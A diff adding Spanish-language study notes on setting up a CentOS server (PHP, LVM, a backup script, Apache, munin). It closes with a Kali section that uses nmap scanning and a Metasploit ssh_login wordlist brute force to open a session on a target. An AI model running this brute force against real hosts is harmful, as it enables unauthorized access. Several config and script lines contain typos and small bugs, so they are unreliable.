@@ -1,0 +1,108 @@
+PHP u;tima versión
+
+sudo yum install epel-release yum-utils
+sudo yum install http://rpms.remirepo.net/enterprise/remi-release-7.rpm
+sudo yum-config-manager --enable remi-php74   # Para PHP 7.4 (puedes cambiar el número según la versión que desees instalar)
+
+sudo yum install php php-cli php-fpm php-json php-opcache php-mbstring php-xml php-gd
+
+sudo systemctl start php-fpm
+sudo systemctl enable php-fpm
+
+php -v
+--------------------------------------------------------------------------------------------
+LVM
+conf
+Disco duro->custom->LVM(sin Encrypt my data)
+Paritición manual==>todo en ext4{ / 2GiB; /home 1GB; /var 4gb; swap 1GB; BIOS 2MB}
+Ethernet->nombre de Host->switch off
+Root password->clave->allow root ssh
+
+yum install nano tar httpd epel-release -y
+nano /etc/fstab #copiamos las rutas hasta antes del espacio
+blkid 'ruta' #copiamos el UUID
+nano /etc/fstab #reemplazamos la ruta con el UUID
+nano /etc/login.defs #configurar la contraseña
+adduser 'usuario'
+passwd 'contra'
+usermod -aG wheel 'usuario'
+nano backup.sh
+	#!/bin/bash
+	FECHA_Y_HORA_ETC=`date "+%d-%m-%y_%H-%M-%S"`
+	NOMBRE_ARCHIVO_ETC="respaldo_ETC_$FECHA_Y_HORA_ETC.tgz"
+	CARPETA_DESTINO="RespaldosSeguridad"
+	CARPETA_RESPALDO_ETC="../etc"
+	#Directorio para respaldos
+	mkdir -p "$CARPETA_DESTINO"
+	tar cfvz "$CARPETA_DESTINO/$NOMBRE_ARCHIVO_ETC" "$CARPETA_RESPALDO_ETC"
+
+	FECHA_Y_HORA_VAR=`date "+%d-%m-%y_%H-%M-%S"`
+	NOMBRE_ARCHIVO_VAR="respaldo_VAR_$FECHA_Y_HORA_ETC.tgz"
+	CARPETA_DESTINO="RespaldosSeguridad"
+	CARPETA_RESPALDO_VAR="../var"
+	#Directorio para respaldos
+	mkdir -p "$CARPETA_DESTINO"
+	tar cfvz "$CARPETA_DESTINO/$NOMBRE_ARCHIVO_VAR" "$CARPETA_RESPALDO_VAR"
+
+	FECHA_Y_HORA_HOME=`date "+%d-%m-%y_%H-%M-%S"`
+	NOMBRE_ARCHIVO_HOME="respaldo_HOME_$FECHA_Y_HORA_HOME.tgz"
+	CARPETA_DESTINO="RespaldosSeguridad"
+	CARPETA_RESPALDO_HOME="../home"
+	#Directorio para respaldos
+	mkdir -p "$CARPETA_DESTINO"
+	tar cfvz "$CARPETA_DESTINO/$NOMBRE_ARCHIVO_HOME" "$CARPETA_RESPALDO_HOME"
+
+chmod 755 backup.sh
+EDIT=nano crontab -e
+	minutos hora días_del_mes mes día /bin/bash /root/backup #0 2 * * 1 /bin/bash /root/backup
+systemctl start httpd
+systemctl enable httpd
+firewall-cmd --zone=public --add-service=http --permanent
+firewall-cmd --reload
+yum install munin munin-node --skip-broken
+cd /etc/munin/
+nano munin-node.conf
+
+	# Which address to bind to;
+	host *
+	#host 127.0.O.1
+	# And which port
+	port 4949
+	log_level 4
+	log_file /var/log/munin-node/munin-node.log
+	pid_file /var/run/munin/munin—node.pid
+	dbdir /var/lib/munin
+	htmldir /var/www/html/munin
+	logdir /var/log/munin
+	rundir /var/munin
+
+
+yum install perl
+yum update
+yum install perl-DateTime
+dnf config-manager --enable crb
+yum install munin munin-node -y
+systemctl start munin-node
+systemctl enable munin-node
+systemctl start munin
+systemctl enable munin
+#comprobar en el navegador ip/munin
+--------------------------------------------------------------------------------------------
+Vulnerabilidades
+
+KALI
+#descargar los diccionarios y ponerlos en el escritorio
+nmap -sP 'ip-de-red.0/24'
+nmap -sT 'ip-a-atacar'
+#abrir metasploit framework
+search 'nombre-del-puerto' #ssh, telnet, etc. buscar un login
+use 'ruta-login' #auxiliary/scanner/ssh/ssh_login
+info
+set RHOSTS 'ip-a-atacar'
+set USER_FILE /home/kali/Desktop/usuarios.txt
+set PASS_FILE /home/kali/Desktop/claves.txt
+set VERBOSE true
+info #comprobar los cambios
+exploit #esperar a obtener un login
+sessions -l #ver el id del login
+sessions -i 'Id'
